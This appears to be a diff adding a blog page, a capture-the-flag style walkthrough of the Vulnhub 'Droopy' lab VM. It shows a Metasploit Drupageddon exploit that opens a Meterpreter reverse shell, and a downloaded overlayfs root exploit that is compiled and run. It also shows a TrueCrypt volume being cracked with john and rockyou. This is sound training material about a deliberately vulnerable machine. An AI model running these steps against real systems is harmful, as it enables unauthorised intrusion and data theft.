@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>Vulnhub Droopy | maggick's logs</title>
+
+    <meta name="author" content="Matthieu Keller">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="http://matthieukeller.com/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="http://yui.yahooapis.com/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="http://matthieukeller.com/theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="http://matthieukeller.com/index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+                <li>
+                  <a href="http://matthieukeller.com/category/misc.html">Misc</a>
+                </li>
+                <li>
+                  <a href="http://matthieukeller.com/category/programming.html">programming</a>
+                </li>
+                <li>
+                  <a href="http://matthieukeller.com/category/programming-security.html">programming, security</a>
+                </li>
+                <li>
+                  <a href="http://matthieukeller.com/category/security.html">security</a>
+                </li>
+                <li>
+                  <a href="http://matthieukeller.com/category/sports.html">Sports</a>
+                </li>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="http://matthieukeller.com/pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="http://matthieukeller.com/pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="http://matthieukeller.com/2016/05/vulnhub-droopy.html" title="Read more" class="entry-title-link">
+                Vulnhub Droopy</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2016-05-10T21:49:00+02:00">10 May 2016</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="http://matthieukeller.com/author/matthieu-keller.html" title="Read more posts from Matthieu Keller" class="meta-link">Matthieu Keller</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="http://matthieukeller.com/tag/drupal.html" title="Read more with the label drupal" class="meta-link">drupal</a> 
+          <a href="http://matthieukeller.com/tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="http://matthieukeller.com/tag/vulnhub.html" title="Read more with the label vulnhub" class="meta-link">vulnhub</a> 
+      </span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left"
+src="/media/2016.05/droopy.png" alt="Droopy homepage" width="162">
+A few days ago, I installed a new pentesting box based on Arch Linux with Kali</p>
+<p>in a virtual machine. In order to test it I select a light vulnbox on vulnhub :
+<a href="https://www.vulnhub.com/entry/droopy-v02,143/">Droopy</a>.
+There were two hints on the description of the machine on the vulnhub download
+page:</p>
+<ol>
+<li>Grab a copy of the rockyou wordlist.</li>
+<li>It's fun to read other people's email.</li>
+</ol>
+<p>We will see how to use them in a moment :)</p>
+
+
+<h2 id="discovery">Discovery</h2>
+<p>Our nmap scan give us nothing but an open 80 port running a HTTP server.
+Let's give a look to the website:</p>
+<p><img alt="Droopy homepage" src="/media/2016.05/droopy.png" /></p>
+<p><a href="https://wappalyzer.com/">Wappalyzer</a> give use the precise version of the Drupal
+used (with the name and to logo of the VM it is easy to deduce that this is a
+Drupal machine). The version is Drupal 7.0 which is vulnerable to CVE-2014-3704
+also called
+<a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon">drupal_drupageddon</a>.</p>
+<h2 id="exploit">Exploit</h2>
+<p>We use metasploit to directly have the Drupal exploit AND directly a
+meterpreter:</p>
+<div class="highlight"><pre><span></span>msf &gt; search drupal
+[!] Module database cache not built yet, using slow search
+
+Matching Modules
+================
+
+  Name                                           Disclosure Date  Rank       Description
+  ----                                           ---------------  ----       -----------
+  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Drupal OpenID External Entity Injection
+  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Drupal Views Module Users Enumeration
+  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  Drupal HTTP Parameter Key/Value SQL Injection
+  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  PHP XML-RPC Arbitrary Code Execution
+</pre></div>
+
+
+<p>We set the RHOST to the VM's IP address</p>
+<div class="highlight"><pre><span></span>msf exploit(drupal_drupageddon) &gt; set RHOST 10.0.2.4
+</pre></div>
+
+
+<p>We check our options</p>
+<div class="highlight"><pre><span></span>msf exploit(drupal_drupageddon) &gt; show options
+
+Module options (exploit/multi/http/drupal_drupageddon):
+
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOST      10.0.2.4         yes       The target address
+  RPORT      80               yes       The target port
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /                yes       The target URI of the Drupal installation
+  VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+  Name   Current Setting  Required  Description
+  ----   ---------------  --------  -----------
+  LHOST  10.0.2.15        yes       The listen address
+  LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+  Id  Name
+  --  ----
+  0   Drupal 7.0 - 7.31
+</pre></div>
+
+
+<p>We launch our exploit against the server and praise for a reverse shell:
+    msf exploit(drupal_drupageddon) &gt; exploit</p>
+<div class="highlight"><pre><span></span>Started reverse TCP handler on 10.0.2.15:4444
+Testing page
+Creating new user ULMihKJWdb:giXrJOFefa
+Logging in as ULMihKJWdb:giXrJOFefa
+Trying to parse enabled modules
+Enabling the PHP filter module
+Setting permissions for PHP filter module
+Getting tokens from create new article page
+Calling preview page. Exploit should trigger...
+Sending stage (33721 bytes) to 10.0.2.4
+Meterpreter session 2 opened (10.0.2.15:4444 -&gt; 10.0.2.4:52349) at 2016-05-10 16:56:46 +0200
+</pre></div>
+
+
+<h2 id="second-hint">Second hint</h2>
+<p>Okay it works, we got a meterperter with the user <code>www-data</code>, let's follow the
+hint a get a look to the e-mails:</p>
+<div class="highlight"><pre><span></span>meterpreter ls /var/mail
+Listing: /var/mail
+==================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100777/rwxrwxrwx  564   fil   2016-04-14 20:32:01 +0200  www-data
+</pre></div>
+
+
+<p>Let's read the e-mails of www-data:</p>
+<div class="highlight"><pre><span></span>From Dave &lt;dave@droopy.example.com&gt; Wed Thu 14 Apr 04:34:39 2016
+Date: 14 Apr 2016 04:34:39 +0100
+From: Dave &lt;dave@droopy.example.com&gt;
+Subject: rockyou with a nice hat!
+Message-ID: &lt;730262568@example.com&gt;
+X-IMAP: 0080081351 0000002016
+Status: NN
+
+George,
+
+  I&#39;ve updated the encrypted file... You didn&#39;t leave any
+hints for me. The password isn&#39;t longer than 11 characters
+and anyway, we know what academy we went to, don&#39;t you...?
+
+I&#39;m sure you&#39;ll figure it out it won&#39;t rockyou too much!
+
+If you are still struggling, remember that song by The Jam
+
+Later,
+Dave
+</pre></div>
+
+
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<p>We need a privilege escalation. Like for
+<a href="http://matthieukeller.com/2015/06/vulnhub-fart-knocker.html#CVE-2015-1328">Fart-knocker</a>
+We can use the CVE-2015-1328 exploiting overlayFS to get a root shell on the
+machine.</p>
+<p>We spawn a shell:</p>
+<div class="highlight"><pre><span></span>meterpreter &gt; shell
+Process 1233 created.
+Channel 1 created.
+</pre></div>
+
+
+<p>We still have the permissions of <code>www-data</code>:</p>
+<div class="highlight"><pre><span></span>id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre></div>
+
+
+<p>We download the exploit <code>ofs.c</code>:</p>
+<div class="highlight"><pre><span></span>wget https://www.exploit-db.com/download/37292
+--2016-05-10 15:58:12--  https://www.exploit-db.com/download/37292
+Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
+Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5123 (5.0K) [application/txt]
+Saving to: &#39;37292&#39;
+
+    0K .....                                                 100%  358M=0s
+
+2016-05-10 15:58:12 (358 MB/s) - &#39;37292&#39; saved [5123/5123]
+</pre></div>
+
+
+<p>We rename the file:</p>
+<div class="highlight"><pre><span></span>mv 37292 ofs.c
+</pre></div>
+
+
+<p>We compile it and add execution permission:</p>
+<div class="highlight"><pre><span></span>gcc ofs.c -o ofs
+chmod +x ofs
+</pre></div>
+
+
+<p>Then we just run it to gain root privileges on the box:</p>
+<div class="highlight"><pre><span></span>./ofs
+collect2: error: ld returned 1 exit status
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+sh: 0: can&#39;t access tty; job control turned off
+id
+# uid=0(root) gid=0(root) groups=0(root),33(www-data)
+</pre></div>
+
+
+<p>Okay let us search for the flag:</p>
+<div class="highlight"><pre><span></span>ls /root/
+# dave.tc
+</pre></div>
+
+
+<h2 id="first-hint">First hint</h2>
+<p>It seems we have a truecrypt volume, let's download it on our machine for more
+investigation:</p>
+<div class="highlight"><pre><span></span>cp /root/dave.tc /var/www/html/
+</pre></div>
+
+
+<p>Then we can download it directly from the server at <code>http://10.0.2.4/dave.tc</code></p>
+<p>We need to extract the hashes from the file to pass them to john, hopefully a
+tool exist just for that (we need to compile it):</p>
+<div class="highlight"><pre><span></span>http://article.gmane.org/gmane.comp.security.openwall.john.user/5320
+</pre></div>
+
+
+<p>As the mail mention the academy and the hint mention the rockyou password list,
+let us just extract the academy related passwords from it:</p>
+<div class="highlight"><pre><span></span>grep academy /media/sf_password_lists/rockyou.txt &gt; /tmp/test
+</pre></div>
+
+
+<p>We launch john against the file with our partial rockyou list:</p>
+<div class="highlight"><pre><span></span>john dave.tc.john -w=/tmp/test
+Warning: detected hash type &quot;tc_aes_xts&quot;, but the string is also recognized as &quot;tc_ripemd160&quot;
+Use the &quot;--format=tc_ripemd160&quot; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 6 password hashes with 6 different salts (tc_aes_xts, TrueCrypt AES256_XTS [SHA512 128/128 AVX 2x /RIPEMD160/WHIRLPOOL])
+Loaded hashes with cost 1 (hash algorithm [1:SHA512 2:RIPEMD160 3:Whirlpool]) varying from 1 to 3
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:01 54.22% (ETA: 17:16:27) 0g/s 59.89p/s 359.3c/s 359.3C/s fordacademy..ffmusicacademy
+etonacademy      (truecrypt_normal_volume)
+1g 0:00:00:03 DONE (2016-05-10 17:16) 0.2724g/s 59.94p/s 331.8c/s 331.8C/s 06academy..!academy
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</pre></div>
+
+
+<p>We mount the container using veracrypt:</p>
+<div class="highlight"><pre><span></span>veracrypt dave.tc -tc
+</pre></div>
+
+
+<p>Let us do a <code>tree -a</code> to see what file we have in this container:</p>
+<div class="highlight"><pre><span></span>.
+├── buller
+│   └── BullingdonCrest.jpg
+├── lost+found [error opening dir]
+├── panama
+│   └── shares.jpg
+└── .secret
+    ├── piers.png
+    └── .top
+        └── flag.txt
+
+5 directories, 4 files
+</pre></div>
+
+
+<h2 id="conclusion">Conclusion</h2>
+<p>Content of ./secret/.top/flag.txt</p>
+<div class="highlight"><pre><span></span>################################################################################
+#   ___ ___  _  _  ___ ___    _ _____ _   _ _      _ _____ ___ ___  _  _  ___  #
+#  / __/ _ \| \| |/ __| _ \  /_\_   _| | | | |    /_\_   _|_ _/ _ \| \| |/ __| #
+# | (_| (_) | .` | (_ |   / / _ \| | | |_| | |__ / _ \| |  | | (_) | .` |\__ \ #
+#  \___\___/|_|\_|\___|_|_\/_/ \_\_|  \___/|____/_/ \_\_| |___\___/|_|\_||___/ #
+#                                                                              #
+################################################################################
+
+Firstly, thanks for trying this VM. If you have rooted it, well done!
+
+Shout-outs go to #vulnhub for hosting a great learning tool. A special thanks
+goes to barrebas and junken for help in testing and final configuration.
+                                                                --knightmare
+</pre></div>
+
+
+<p>It was a nice challenge, mainly for the beginner, probably a lack in the web
+part (or the use of metapsloit, spoil myself of some fun exploiting the SQL
+injection manually).</p>
+<p>Thanks to knightmare for the VM and as always thanks to vulnhub !</p>
+    </div>
+
+        <footer>
+<div class="social-buttons">
+
+
+</div>        </footer>
+
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = "matthieukeller";
+        var disqus_identifier = "2016/05/vulnhub-droopy.html";
+
+        (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-books"></span>
+                    <a href="/pages/books.html">books</a>
+                </li>
+                <li>
+                    <span class= "icons icons-palmares"></span>
+                    <a href="/pages/palmares.html">palmares</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/matthieukeller">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-linkedin"></span>
+                    <a href="https://linkedin.com/in/matthieukeller">linkedin</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+    <script>
+        (function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
+        function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
+        e=o.createElement(i);r=o.getElementsByTagName(i)[0];
+        e.src='//www.google-analytics.com/analytics.js';
+        r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
+        ga('create','UA-63314567-1');ga('send','pageview');
+    </script>
+
+</div>
+</body>
+</html>
